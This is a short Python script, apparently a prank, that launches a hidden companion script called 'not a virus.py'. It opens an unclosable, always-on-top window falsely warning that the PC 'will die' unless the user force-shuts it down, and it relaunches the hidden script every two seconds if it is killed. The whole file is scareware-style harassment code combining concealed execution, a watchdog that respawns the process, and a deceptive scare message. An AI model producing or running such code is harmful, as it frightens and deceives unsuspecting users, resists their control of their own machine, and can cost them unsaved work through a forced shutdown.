import tkinter as tk
import os
import time
import subprocess

# Start the prank script
subprocess.Popen(["python", "not a virus.py"], creationflags=subprocess.CREATE_NO_WINDOW)

root = tk.Tk()
root.overrideredirect(True)  # Remove window decorations
root.attributes('-topmost', True)  # Keep on top
root.geometry(f"+50+50")  # Slightly offset from the other window

label = tk.Label(root, text="note:your pc will die if you dont force-shutdown your pc", font=("Arial", 14), fg="black")
label.pack(padx=20, pady=20)

# Prevent closing
def disable_event():
    pass

root.protocol("WM_DELETE_WINDOW", disable_event)

# Watch for the prank script closing
def check_prank():
    if not any("not a virus.py" in p for p in os.popen('tasklist').read().splitlines()):
        subprocess.Popen(["python", "not a virus.py"], creationflags=subprocess.CREATE_NO_WINDOW)
    root.after(2000, check_prank)  # Check every 2 seconds

check_prank()
root.mainloop()
